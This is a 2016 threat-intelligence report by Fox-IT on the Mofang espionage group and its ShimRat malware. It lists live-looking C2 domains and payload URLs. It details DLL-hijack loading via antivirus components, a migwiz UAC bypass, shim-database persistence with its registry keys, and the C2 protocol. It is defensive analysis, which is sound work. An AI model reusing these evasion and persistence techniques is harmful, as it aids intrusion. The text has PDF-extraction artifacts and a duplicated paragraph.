created with WPS Office. This product, also known as Kingsoft Office, is a Chinese product comparable to Microsoft Office. Artifacts can be seen in document metadata as shown in Figure 1.3 Simplified Chinese is set as the character set in many of the resources inside variousmalware samples, as shown in Figure 2.Figure 1 detail of decoy document metadataFigure 2 Resource information inside a malware samplefox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 7Figure 3 , ! used in the 1991 Hong Kong comedy Tricky Brains4 An earlier version of ShimRat’s C2 communication protocol used two very specific words as keywords for requests and responses: Yuok and Yerr. Although the meaning is not directly obvious, it may be an approximate phonetic representation of the Cantonese  , beat him or kill him. If this is true, it would suggest at least passive knowledge of Cantonese on the part of the malware author. The use of Yuok and Yerr was discontinued and replaced by ataD or Data in 2013, as shown in the side by side comparison in Figure 4. The current communication protocol is documented in paragraph 7.1.6.Figure 4 Side by side comparison of previous and current C2 communication8 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016CanadaUnited StatesGermanyIndiaSouth KoreaMyanmarSingaporeGovernment Weapon Industry**R&D departments speci(cid:3)callyFigure 5 Countries and sectors targeted by Mofang2.2 Mofang’s targets: a diverse set of entities On analysis of the organizations that were attacked by Mofang in the past, at first glance it appears that there is no particular sector or country that it targets. Figure 5 shows aggregate information about known attacks from the past four years.Looking at the attacks, it is highly likely that targets are selected based on involvement with investments, or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is most clearly the case in the campaign focusing on Myanmar. In it, a company was attacked that was involved in a special economic zone1 in Myanmar, which would be of specific interest to China’s National Petroleum Corporation’s investments. It is highly likely that they were targeted because of this, as new waves of attacks can be correlated with events surrounding the investments in that area.1Special economic zones, ofwhich Myanmar currentlyhas three, are specific areaswithin a country wherecertain laws and regulationsare different from the rest ofthe country, usually with theaim of furthering the ‘host’country’s economy.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 93 The distinct modus operandiof MofangThe Mofang group uses distinct malware that dates back to at least February 2012. The two tools used in their campaigns are: 1 ShimRat 2 ShimRatReporterAs far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. The only exploits the group uses are privilege elevation exploits built into their own malware. The vulnerabilities that were being exploited were already known about at the time of use. A more detailed description of the malware can be found in paragraph 7.1 and 7.2.The Mofang group has a distinct method of carrying out attacks using these two tools, with the goal of stealing information. In short, their method, which is described below, can be summarized as follows: 1Initial reconnoitering compromise: an initial compromise is performed on specific employees of a targeted organization with the aim of extracting key information about the target infrastructure to be used in stage 2;2 Faux infrastructure setup: the group sets up (external) infrastructure designed toavoid attracting attention;3 The main compromise.3.1 Stage 1: Initial reconnoitering compromise For the initial compromise, an ‘environment mapping tool’ known as ShimRatReporter, is delivered to suitable targets. ShimRatReporter can extract a wealth of information about an infrastructure, but the most pertinent data needed for the next stage in their attack are: • Local privileges for the infected user; • Local domain; • Local proxy setup; ShimRatReporter is fully explained in chapter 7.2.The delivery method of ShimRatReporter is most likely through emails pointing to an executable placed on a compromised (and trusted) website.fox-it has observed targeted and untargeted variations of the initial stage of the attack: 1 Untargeted: the ShimRatReporter sends out the report with the information and immediately downloads the ShimRat malware from a hardcoded location. This variation is probably less targeted, with victims added to the global campaign C2 for check-in and control. For more information about the global campaign, see paragraph 6.4.2 Targeted: the ShimRatReporter sends out the report and exits afterwards. The ShimRatReporter tool was only used to map out the victim but in no way to auto- mate further infection (yet).10 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016Modus operandi of the Mofang groupTargeted campaignh e ri n g informationtagTarget organizationGlobal campaignh e ri n g informationtagSpear phishing attack with ShimRatReporter1TargetSetting up the customizedinfrastructure22Operators3Setting up the infrastructureThe main attack witha customized ShimRat versionThe main attackwith ShimRatcontrolinformationVictim’s PCs and servers with classi(cid:127)ed informationfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 113.2 Stage 2: Faux infrastructure setup The second stage of an attack is setting up a faux infrastructure, specifically to mimic the anti-virus products used by the target or the target itself. The ShimRat malware then communicates over HTTP with preconfigured command and control servers. A combination of typo-squatting and closely related names are used to register domains under the same or different tlds.This method of setting up command and control infrastructure is customized for each target and campaign. Anything outside of campaigns targeting specific companies is added to the ‘global campaign’ which is described in paragraph 6.4. The global campaign infrastructure mimics the Microsoft Windows or Microsoft Office software.3.3 Stage 3: The main compromise After having gathered all necessary information about the locally configured proxies and having set up a faux infrastructure, a custom built version of the ShimRat mal- ware will be deployed to infect users with preconfigured local proxies, C2 servers and persistence information.As mentioned before, delivery of ShimRat relies heavily on social engineering, through the use of emails enticing targets to open an attached (decoy) document. These doc- uments contain actual text to make the target think it was indeed a legitimate Word document, pdf file or Excel sheet. When the document is opened, an executable is dropped which decompresses the final payload and places it on disk.The final payload consists of ShimRat bundled with extra files: legitimate application files which suffer from dll hijacking vulnerabilities. These vulnerabilities are used to launch the actual malware. The legitimate application is started which in turn runs the actual malware. A benefit of this method is that the malware runs under the process of a legitimate application. When it requests higher privileges via uac, the uac warning screen will show this legitimate application. Also, anyone inspecting running applica- tions, would see legitimate software running.It is worthy to note that the Mofang group commonly exploits dll hijacking vulner- abilities in anti-virus products for persistence purposes, presumably in order to look as harmless as possible. Over the years they’ve used application components from Norman, McAfee and Norton. A complete list of the used applications can be found in paragraph 9.4. The methods of persistence (described in paragraph 7.1.1) are sometimes adapted depending on the target. Rather than using generic texts in the persistent services, customized names and descriptions are used, based on the installed software information that was extracted with the ShimRatReporter tool previously.Follow up actions in the attacks, such as stealing information or lateral movement through the network, are possible with the capabilities of the ShimRat malware as has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 134 A history of past attacksThe first activity of the Mofang group was seen in February 2012, when the first version(s) of their malware, ShimRat, was seen in attacks.Based on compile time artifacts in the first versions of the malware, it is likely that the project had started 2012. A program database path, a file present on the authors’ machine used to aid in debugging the malware, present in early samples gives more indication that the project started in 2012:z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdbThe following is a timeline from early 2012 through to 2016. This timeline contains development information and a small subsection of the incidents that fox-it is aware of related to this group. The Mofang group is currently still active.14 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016n Gl2012JanuaryFebruaryMarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecember2013JanuaryFebruaryMarchAprilMayJuneJulyAugustHistory and TimelineShimRat First ever ShimRat malware sample observed in an attack. The initial work- ing folder for the authors of ShimRat was ‘project2012’ which indicates this malware was created in 2012.ShimRat An attack took place against a Myanmar government entity. A compromised government server from the Ministry of Commerce was used as a C2 server. Image: see page 20ShimRat An unknown organization was attacked using a fake Google mail domain for payload staging. The C2 was also running on this fake Google domain.ShimRat A Canadian organization was attacked. Custom infrastructure was used.ShimRat An attack started against an unknown organization. The organi- zation was running ‘AVG Antivirus’ internally and the infrastructure setup mimicked an AVG Antivirus domain.ShimRat An unknown organization was attacked. The C2 infrastructure was setup to mimic the New York Times website.ShimRat An attack was started against a German automotive company specializing in vehicles for armed forces.ShimRat An attack was started against another german automotive company. Infrastructure was setup specifically for this target. Company proxy configurations were present in samples indicating an earlier breach.AttacksDevelopmentShimRatShimRatReporterfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 15n An attack started against a US government organization. The lure used was a registration form for an electronic warfare training course. C2 infrastructure from the global campaign was used. Image: see page 23ShimRat An attack started against the exhibitors of the 2013 MSME DEFEXPO in India. C2 infrastruc- ture from the global campaign was used. Image: see page 22ShimRat An organization in Singapore was attacked. Custom infrastructure was setup.ShimRatReporter An attack started against an unknown organization in either the United States or CanadaShimRatReporter An attack started against a Myanmar government entity. A documented from the ‘HumanRightsNow’ organization named ‘Status of Human Rights and Sanctions in Myanmar – April 2014’ was used as a lure and decoyShimRat An attack was started against an unknown South Korean organi- zation. The C2 infrastructure was hosted on a compromised server.ShimRatReporter First ever ShimReporter malware sample observed in an attack.ShimRat An attack was launched against an unknown US organization. The C2 infrastructure was hosted on a compromised server. The lure was faked payment documents.ShimRat An attack started against an unknown organization. The C2 infrastructure was setup to mimic a travel agency of some kind.16 | fox-it | Mofang | A politically motivated information stealing adversary | May 20162015JanuaryFebruaryMarchAprilJuneJulyAugustSeptemberOctoberNovemberDecemberongoingn An attack started against a Myanmar government entity. Payloads during the campaign were staged of a compromised Burmese government server.ShimRatReporter An attack started against a company called ‘CPG Corp’ active in the Myanmar special economic zones. This campaign is described under section 6.2.ShimRat An attack started against a Myanmar entity. The payload was staged from the Myanmar port authority webserver. Image: see page 20ShimRatReporter An attack started against an unknown entity tracked in the ‘Global Campaign’ described in section 6.5.ShimRatReporter An attack started against an unknown entity in Myanmar. The payload was staged from the official website for the Myanmar national airline. Image: see page 21ShimRat An attack started against a US organization leveraging a fake Citrix website. The domain for the payload was an old expired domain that used to host a legitimate piece of software. Image: see page 24ShimRat An attack started against an unknown organization, the campaign used global campaign infrastructure. The lure used was a document about LED lighting and semiconductor technology.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 17Myanmar Special Economic Zones (SEZ)Kyaukphyu SEZThilawa SEZDawei SEZ5 Campaigns in Myanmar5.1 Activities related to the Kyaukphyu Special Economic Zone Since 2009, foreign investment in Myanmar has increased substantially. While it amounted to around usd 300 million in 2009–2010, it grew to usd 20 billion in the period of 2010–2011. To further increase and facilitate foreign investment, the government of Myanmar established special economic zones (sezs). These zones are supposed to encourage economic growth and foreign investments even more. These sezs would give investors a variation of tax reliefs, 5 year tax holidays as well as longer land leases.In 2011 Myanmar established the Central Body for the Myanmar Special Economic Zones, a regulatory body which would oversee foreign investments in the sezs. In the same year the sez law and Dawei law were also passed, establishing a set of three sezs in Myanmar. The current sezs under development in Myanmar are the Dawei sez, Thilawa sez and the Kyaukphyu sez2.The Mofang group has been active in relation to the Kyaukphyu sez. The state owned China National Petroleum Corporation (cnpc) has been investing in this sez since early 2009 after signing a memorandum of understanding (MoU) with the Myanmar government. This MoU, not legally binding, established the development, operation and management of an oil and gas pipeline by the cnpc. This investment by the cnpc ensured their position to get these pipelines running from the Kyaukphyu sez to mainland China. This pipeline would be completed in combination with a seaport to be built in the sez as well. This port, and pipeline, would save the cnpc about 5,000 kilometers of sailing and eliminate the need to go through the Strait of Malacca. While an agreement was signed, an MoU is not legally binding in any way and either party can always step out.This was perhaps a fear on the Chinese part when the government of Myanmar started a consulting tender for the Kyaukphyu sez in 2013. The idea behind this tender was to pick a consortium that would become the advisor for the Kyaukphyu sez, meaning they would oversee operations and make decisions on certain investments. In late September 2013 this tender closed3 and in early March the results were presented4. A consortium led by the cpg Corporation, a company originating from Singapore, was the winner and would become the sez consultant.In 2014 the Myanmar government with the help of cpg Corporation initiated another tender, this time to set up infrastructure in the sez. This tender closed in November and results would be put out early 2015. The date of the publication of the tender outcome passed but no information was published. In late June the Myanmar government still had not put out any word who would win infrastructure investments for the sez5. One of the contenders for this tender was China’s citic group.2url the end of June 2015 Mofang started its campaign to gather information of a specific target in relation to the sezs: the cpg Corporation. The first attack started in early July with a ShimRatReporter payload.18 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016The lure used in this attack is interesting and specific to this attack and location. Burmese characters are not representable in the current Unicode character sets. The Zawgyi font6 was created to accommodate for this. One can download special appli- cations to support this font. This is usually required when submitting information on websites using the Burmese character set. The locations where these applications are downloaded from are public blogs and other public download locations.This need to install the Zawgyi fonts by cpg employees is what Mofang used to infect initial cpg targets: the ShimRatReporter was presented as AlphaZawgyl_ font.exe. The reporter would call back to a domain set-up to mimic the official cpg domain cpgcorp.com.sg. The C2 server for the initial ShimRatReporter payload was cpgcorp.org with the reporting gate being located at library.cpgcorp.org/links/images/ file/blanks.php.There were a few attacks with ShimRatReporter using the above mentioned C2 domain. However, a later sample showed how the Mofang group used the information gathered by the reporter for follow up attacks. Another C2 domain, secure2.sophosrv.com , was set up, which mimicked the official secure2.sophos.com domain. This is presumably based on information from the reports that the cpg Corporation internally used the Sophos Antivirus products. This ShimRatReporter sample was preconfigured to download the 2nd stage payload, ShimRat, from the following two locations:library.cpgcorp.org/links/images/blanks.jpg secure2.sophosrv.com/en-us/support/blanks.jpgThe downloaded ShimRat payload contacted its C2 server gate at secure2.sophosrv. com/en-us/support/ms-cache_check.php. One thing to note is that while all of the communications by ShimRat to its C2 server used HTTPS, ShimRatReporter operates under plain HTTP.The actual publication of the outcome of the infrastructure tender was postponed until the start of 2016. Early 2016 the results came in and China’s citic group had won the tender7. This allowed China to continue building upon their gas and oil infrastructure as well as the seaport.Figure 6 Satellite images showing Kyaukphyu SEZ developments. Image © 2016 Google Earth.6url#Why_not_Zawgyi.3F7url | Mofang | A politically motivated information stealing adversary | May 2016 | 195.2 Earlier campaigns in Myanmar Myanmar has been the target of Mofang’s attacks for years before the campaign related to the sez. Throughout the years, the Mofang group has compromised countless servers belonging to government or other Myanmar related organizations, in order to stage attacks. A few notable ones are described below.The earliest activity from Mofang in Myanmar dates back to around May 2012 when they attacked a government entity. Interestingly they abused a Myanmar government server they had compromised earlier, to function as the C2 server. It was the website of the Ministry of Commerce located at commerce.gov.mm. The C2 gate was located at /templates/css1/logon.php.Another compromised server from the Myanmar government used to stage a ShimRat payload that was seen around early June 2015. The payload for this campaign was located website of the Myanmar port authorities at the time. The C2 server for this campaign was dns.undpus.com.Figure 7 The Myanma Port Authority website was used to stage at attack in June 2015In late September 2015 Mofang used the website of Myanmar’s national airline hosted at www.flymna.com for an attack against an organization in Myanmar. The payload was located at www.flymna.com/sites/photo.tar and contained ShimRatReporter. After executing it would send its report to a C2 server at dns.undpus.com but also download a payload from a preconfigured location. This location was: dns.undpus.com/myanmar.jpg.20 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016Figure 8 The website of Myanmar’s national airline was used to stage an attack in September 2015fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 216 Other notable campaignsand attacksThis chapter highlights a few campaigns and attacks that provide further illustration to Mofang’s motives and attack method.6.1 Attack on Indian defense expo exhibitors The ‘International MSME Sub-Contracting & Supply exhibition for Defence – Aerospace – Homeland Security’ (MSME DEFEXPO) is an annual Indian exhibition and confer- ence. It allows MSMEs8 to show their current and new capabilities in the defense and aerospace technology to various government agencies. Over the years, its exhibitors have been a continuing target for the Mofang Group.In 1991 India initiated its Look East policy9 aiming to strengthen their relations with Southeast Asian countries, and to become a counterweight against the influences of China in the region. In addition, India, just like China, has a strategic interest in and strong relations with Myanmar. For example, the countries hold joint military exercises. Additional insight into the activities and capabilities of the MSMEs at the expo would be strategically advantageous for China. Please note that there might be other reasons, why the Mofang Group was interested in this expo.The changes are about even that the targets for the MSME DEFEXPO campaign were a selected group of exhibitors. They were targeted with spear phishing emails containing Word documents or Excel sheets enticing them to install the ShimRat malware. An example of the 2013 lure is shown in Figure 10.In 1991 India initiated its Look East policy9 aiming to strengthen their relations with Southeast Asian countries, and to become a counterweight against the influences of China in the region. In addition, India, just like China, has a strategic interest in and strong relations with Myanmar. For example, the countries hold joint military exercises. Additional insight into the activities and capabilities of the MSMEs at the expo would be strategically advantageous for China. Please note that there might be other reasons, why the Mofang Group was interested in this expo.Figure 9 Exhibitors at the Indian MSME DEFEXPO are routinely attacked8Micro, Small and Mediumsized Enterprises9url 10 Excel document used to infect Defexpo 2013 exhibitors22 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016The Excel sheet in the 2013 campaign contained an embedded ShimRat sample bea- coning out to a C2 server hosted at store.outlook-microsoft.net with the panel gate being located at /en-us/c/index.php. The 2013 campaign didn’t feature a target specific C2 infrastructure, but actually used infrastructure from the global campaign written about in paragraph 6.4. The probable reason for this becomes clear when looking at a campaign that was running at the same time as the MSME DEFEXPO 2013.The attendees of the ESSENTIALS OF 21st CENTURY ELECTRONIC WARFARE COURSE, a training course for government employees in the US, held in Alexandria, Virginia were also targeted. The lure in this case was the official registration form send out to attendees as shown in Figure 11. The infrastructure was set up to aid in two campaigns taking place at the same time.Figure 11 Document used to infect attendees of the Essentials of 21st Century Electronic Warfare Course held in Virginia, USA year later, the MSME DEFEXPO 2014 was scheduled and again exhibitors were being targeted. This time the campaign and infrastructure was setup specifically for this attack. Lures were send out via mail once again, similar to the 2013 campaign. This time the C2 domain followed their general methods as described in chapter 3: it mimicked the MSME DEFEXPO website. They used images.defexpoindia14.com for their C2 communication and the panel gate was hosted on /se/index.php.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 236.2 Attack on ‘seg’ In December 2012 Mofang started a campaign against a new target, called ‘seg’ for the purpose of this report. The victim was compromised with at least ShimRatReporter as the 2nd stage ShimRat payload was preconfigured with the local proxy of this organization.The configuration for this build was interesting and reflects the method as described in chapter 3. Table 1 contains a subsection of the configuration for this build.Configuration items C2 Gate location Service descriptionConfiguration values support.f--secure.com /cache/cache.php HTTP proxy.seg.local:8080 mshelpsrvs Windows Help Services Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable.Table 1 A subsection of the configuration build for the ‘seg’ attackFrom the configuration it can be determined that the company was running F-Secure Antivirus and Mofang registered the domain to not appear suspicious. The preconfig- ured proxy and the C2 domain shows the targeted nature of this campaign. The fake F-Secure domain was in control of Mofang until March 2014, when they transferred the domain to a domain broker. F-Secure’s brand monitoring picked up on the domain and bought it from this domain broker after it became available.6.3 Attack using a Citrix lure In September 2015 Mofang launched another attack. As per their usual modus operandi, this attack relied on social engineering to infected targets. For this campaign the Mofang group used a domain that used to belong to a company called Citrix. The website citrixmeeting.com was under control of Citrix until they let it expire on April 3rd, 2015. The website used to hold information about the conferencing products from Citrix.Almost 4 months after the domain expired, on July the 27th, the Mofang group regis- tered the domain and set it up for their newest campaign. A new version of ShimRat was built on the 7th of September, uploaded to the server and only days later used in a new campaign. The payload was hosted at url livechat.exe and contained a newly packaged ShimRat sample and a new dll hijacked program. They upgraded their dll hijacking program away from Norman and McAfee, part of the C++ runtime provided by Microsoft.The ShimRat sample contacted a C2 server located at api.officeonlinetool.com, the panel gate was hosted on /index.php.6.4 The global campaign While the Mofang group has specific targets and runs campaigns focused on them, they also run something that fox-it calls the global campaign. This global campaign is a set of servers functioning as infrastructure with domains impersonating Microsoft and Google services to which a wide variety of victims is connected. The global campaign was observed before the ShimRatReporter tool and this makes sense given that the reporter is used to gather specific information about target infrastructures. Prior to its availability, the group could only use more generic C2 domains.While many attacks can be traced back to the exact targets because Mofang emulates a target’s environment, the exact victims of the global campaign are much more difficult to identify. It appears Mofang uses the more generic service domains to play it safe. The global campaigns also share a lot of infrastructure across the different domains. Looking at the C2 domains in Table 2 that fox-it has classified as the global campaign, it becomes clear that the domains of Microsoft and Google services are used for imitation purposes:Typosquad Google domains account.google.com.gmgoogle.com mail.upgoogle.comTable 2 Global campaign C2 domainsTyposquad Microsoft domains ie.update-windows-microsoft.com support.outlook-microsoft.com help.outlook-microsoft.com oem.outlook-microsoft.com windws-microsoft.com store.outlook-microsoft.comfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 257 Preferred tools7.1 ShimRat ShimRat is a custom developed piece of malware known as a ‘RAT’, Remote Administration Tool. It has among others standard capabilities for filesystem interaction.The malware was originally built in 2012 and its features were expanded over the years. The artifacts left in the first samples, are a good indicator that the project has been started in 2012. Multiple pdB paths were seen in the early versions of ShimRat. These PDB paths are not visible in the latest versions of ShimRat, due to how the samples are prepared. The PDB paths are either stripped or filled with different paths.z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdbThe terms InstallScript and ServiceApp in the pdB paths are the two parts that malware consists of. InstallScript is the first stage of ShimRat which takes care of persistence, while ServiceApp is the second stage of the malware which performs C2 communication and exposes the infected machine to the operator.Over the years the developers of ShimRat have extended the malware with additional functionality, such as: • Persistence: originally ShimRat only supported registry startup keys and service creation in order to become persistent. Additionally, the authors developed the capability of installing a shim database for persistence in 2015.• Privilege elevation: a method to bypass Windows uac to gain higher privilegeswas implemented. The technique relied on the Migwiz Windows component. Migwiz is an application used in Windows which automatically runs in high integrity mode10. The hijacked DLL will also run in this mode allowing a uac bypass, one of many methods that exists11. This method was not developed by the ShimRat authors, but was public and the changes are even they simply copied it into their malware.One interesting technique they’ve been using is dll hijacking of antivirus components. ShimRat samples delivered from around end 2013/start 2014 on, abused legitimate antivirus applications to hijack. The reason for this is to hide itself even more. When a user would check the running process list, a legitimate Antivirus process would appear to be running. The exact list of applications is available in paragraph 9.4. The Mofang group has a preference for Antivirus products only. fox-it has not observed any other vulnerable application except for antivirus products being used.10url | fox-it | Mofang | A politically motivated information stealing adversary | May 2016Mofang packages the anti-virus components with 2 files in order to run ShimRat. One is the dll to hijack. The second file is a compressed ShimRat core dll with shellcode in a .dat file. When the antivirus component is started the dll is loaded which in turn maps the .dat file in memory. The shellcode subsequently decompresses the core of ShimRat which comes in the form of a dll and executes it. Usually the .dat file has the same name as the dll file.Figure 12 Shimrat and anti-virus componentsThe way samples arrive at targets is usually in a packed form containing a lure document. The initial payload a target receives, will extract a lure document, present the user with this, but also extracts and runs a 2nd stage loader which will drop ShimRat on the target system. This 2nd stage loader in the current version of ShimRat and contains the antivirus component and as well as the two auxiliary files containing the ShimRat core.7.1.1 Installation & Persistence One of the first things ShimRat does while active is making sure it becomes persistent on the system. Before actually activating any methods of persistence it will try to elevate privileges if needed it is not running with administrative privileges.ShimRat elevates its privileges by performing a dll hijacking attack on vulnerable Windows components. Specifically, it abuses the migwiz.exe program by hijacking cryptbase.dll. ShimRat will try to gain higher privileges, but will continue to execute whether the elevation was successful or not. This elevation would make sure no uac popups would be shown to the victim. Would the user get uac popups they would appear to be coming from the antivirus product ShimRat hijacked, as mentioned before.ShimRat has three methods of becoming persistent on a system: 3Installing a registry startup key Installing a service Install a shimfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 27Internally ShimRat uses an installation configuration which is set by the builder. The persistence configuration structure looks as follows (see Table 3):Configuration items Injection target processTable 3: Persistence configuration structure.The installation mode in the configuration structure, is a switch to decide which per- sistence method to use. If the switch is set to 1 it will become persistent by installing a service. If it is set to 2 it will install a shim to become persistent. As a fall back method, if either installing a service or installing a shim would fail, it will use a registry startup key for persistence.7.1.2 Persistence through a registry startup key As explained, when persistence through a service or shim fails, ShimRat falls back to a registry based startup-key. It takes the installation filename variable from the configuration and uses this as the key name. The file path is based on the installation file path variable in the configuration.The key is registered under:HKCU\Software\microsoft\windows\CurrentVersion\Run7.1.3 Persistence through a service ShimRat will create a new service under Windows using the information from the instal- lation configuration shown in paragraph 7.1.1 above. This operation is performed through the Windows api functions available for registering, updating and starting of services12. It will start by stopping and removing any old service (if any exist). ShimRat will register a new service using the information from the persistence configuration and start it, after checking and removing any old services.7.1.4 Persistence through shims13 Over the years Microsoft has gone to extraordinary lengths to ensure backward compatibility on its Windows platform. One of the outcomes of this process was the creation of the Application Compatibility Framework (acf) which helps ensure this compatibility. Through this framework, special fixes known as Microsoft Fix It’s or just fixes can be run which can help mitigate security or compatibility problems.12url | fox-it | Mofang | A politically motivated information stealing adversary | May 2016The way the acf works is that when a process is started, it will determine if the newly created process needs to be shimmed. If this is the case, a special flag is raised to indicate this. Based on this flag the operating system will load the installed Shims and apply the required fixes. This means shims are simply hot patching processes on the fly. Most predefined fixes released by Microsoft are stored in:%WINDIR%\AppPatch\sysmain.sdbAny fix not defined in this sdb file, is called a ‘Custom Fix’ and can be installed by anyone with knowledge of the workings of this system.ShimRat uses a shim to perform an application fix using an InjectDLL fix. An InjectDLL fix will inject a specified dll into a target process, this allows the code from the dll to run in the context of the target process. ShimRat has implemented this shim for both 32 and 64 bit platforms. In technical terms, the fix remains the same InjectDLL fix, but the dll ShimRat injects is different.Normally when an official Fix It shim is installed it would be an official update or patch of some kind and this would be registered as being installed as an update. This means the shim is visible in the software manager in Windows under the Windows component section. ShimRat shims do not appear in the software manager due to the way it installs the shims. Normally when a shim is installed, it is performed via the official installer which will register the Shim and place it in the correct location. ShimRat performs the registration of the shim manually, bypassing the official installation and in turn making sure that it won’t show up under the installed software in Windows.The shim databases are installed in either of two locations:%WINDIR%\AppPatch\Custom\ (32 bit) %WINDIR%\AppPatch\AppPatch64\Custom\ (64 bit)After placing the files on disk, ShimRat manually loads the shims into the shim database by first registering it in the registry at two specific locations as shown in Figure 13.HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDBfox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 29Figure 13 An example of a 32-bit ShimRat infection with shimsAfter filling the registry keys, ShimRat calls SdbRegisterDatabaseEx to register the database and finally ShimFlushCache to flush the cache and enable the shim. From this point on, every newly started instance of svchost.exe will be shimmed and ShimRat will be. It locks itself with the use of mutexes, to ensure there aren’t multiple copies of ShimRat running. ShimRat mutexes are a combination of the string Global\\qwe followed by one or more numbers.7.1.5 Built-in capabilities of ShimRat ShimRat has a set of inbuilt capabilities to give the operators control over their victim. The following is a list of capabilities seen in one of the most recent samples.The operators are currently able to use ShimRat for among others: • Enumerate connected drives • List, create and modify directories • Upload and download files • Delete, move, copy and rename files • Uninstall itself7.1.6 Command and control communication ShimRat communicates over HTTP to its C2 server. While versions since 2015 have seen the introduction of HTTPS usage, ShimRat does not appear to verify the SSL certificate of C2 servers, which are generally self-signed certificates. ShimRat does have the ability to use pre-configured HTTP proxies, which is useful in situations where a victim has forced local proxies in the network with authentication.30 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016Like with persistence, ShimRat holds a C2 communication configuration internally. The structure of the configuration looks as follows (see Table 4):Configuration items Primary C2 location Secondary C2 location Campaign ID C2 server password Proxy passwordTable 4: C2 communication configuration.ShimRat communicates with its C2 server through a pull and push mechanism. ShimRat constantly asks its C2 server for commands and once it has executed a command, it will send back the result. The structure of the commands exchanged with the C2 server is quite simple: • Every command is encapsulated within two tags, currently these tags are the word ‘Data’ which is added in front of and at the end of the command string. In the past this used to be the string ‘Yuok’ as described in paragraph 2.1.• Every command has a unique ‘ID’. These IDs are notated as $$<ID number> • The final structure of the commands send to and from the C2 server is:<data tag><command ID><command data><data tag>For example, when ShimRat first connects to a C2 server it registers itself. This initial command id is 00, the registration command, followed by the associated data. In this case, the data comprises basic information including the machine name, DEMO-PC, system information, 0800232979FD-SYSTEM, the C2 password, test, its version and the operating system version and whether it is a 32 or 64bit operating system in the last part.ShimRat will continue sending the initial check-in data until the C2 server responds with Data. Once it has received this response, which indicates it registered successfully, it will start polling for new commands to execute.fox-it | Mofang | A politically motivated information stealing adversary | May 2016 | 31It polls the C2 for commands by sending command id 02 in combination with its system information:Data$$02#DEMO-PC-0800232979FD-SYSTEMDataThe C2 server will respond with one of 3 possible tags: • Atad: returned when there is nothing to do for the malware. ShimRat will sleepfor a specified time period before polling again.• Aatd: returned when the C2 does not recognize the system information. It forcesShimRat to register itself again. After registering itself again ShimRat will continue polling the C2 server for commands.• Data: returned when a command is available. The whole response string wouldactually be Data$$<command ID> where ShimRat would parse the command id, execute the desired command and send the result back to the C2. Details of which command ID maps to which command can be found in Table 5.Table 5 lists the possible command ids that a C2 server could send (the Initiating command id) and the corresponding responses by ShimRat (the Responding command id). Some commands will result in one or more different responding ids based on the data ShimRat has to send back. Please note, that there are checks when executing these commands where the key- words Atad Aatd and Data are used to evaluate the outcome of the command. These states are not described or shown in the table, nor does the table include command ids 00 and 01 which are used for initial registration and command polling respectively.FunctionInitiating command IDResponding command ID(s)Enumerate drives -Table 5 Overview of ShimRat functions mapped to command IDs32 | fox-it | Mofang | A politically motivated information stealing adversary | May 20167.2 ShimRatReporter7.2.1 Summary ShimRatReporter is a tool first seen in late 2014. The goal of this tool is to gather important information about the target infrastructure. More details about this are available in paragraph 7.2.2.Additionally the tool can be configured to download a 2nd stage payload from 1 or 2 preconfigured locations. The idea behind ShimRatReporter is to be able to deliver customized ShimRat builds. This can be seen in the preconfigured proxy configura- tion in some of the attacks. In these attacks, the ShimRat builds that were sent to the target machines were already configured with the credentials for the local proxy in the target network.7.2.2 Report generation ShimRatReporter generates a text based report to send out to its C2 server. The report is constructed with the following sections.SectionContentsReport header Network informationOperating system Browser and proxy configuration Active user sessionsUser accountsInstalled softwareReport footerThe header contains a timestamp at which the report was made and the local computer name. The first section is titled IP-INFO and contains information about the Windows IP configuration. This includes local IP information, routing tables, mac address, gateway, dns servers and whether the network has dHcp enabled. The second section is titled Network-INFO and contains a list of all the tcp and udp endpoints (similar to the output of the Netstat command) by formatting the output of the GetExtendedUdpTable and GetExtendedUdpTable Windows api functions. This section is titled OS-INFO and contains the operating system name and specific windows version including any service packs if they are installed. This section is titled Process-INFO and contains a list of all the running process on the machine including their pid and parent pid. This section is titled Browser-INFO and contains the User-Agent of the default browser as well as any proxy configurations set in the registry. This section is titled QueryUser-INFO and contains a list of active sessions on the machine enumerated with the WTSEnumerateSessions Windows api function. This section is titled Users-INFO and contains a list of the non-privileged and privileged accounts that are available on the machine. This section is titled Software-INFO and contains a list of all the installed software on the machine excluding any Windows updates / components. The footer of the report contains some additional information on whether the 2nd stage payloads, if configured, were successfully downloaded and 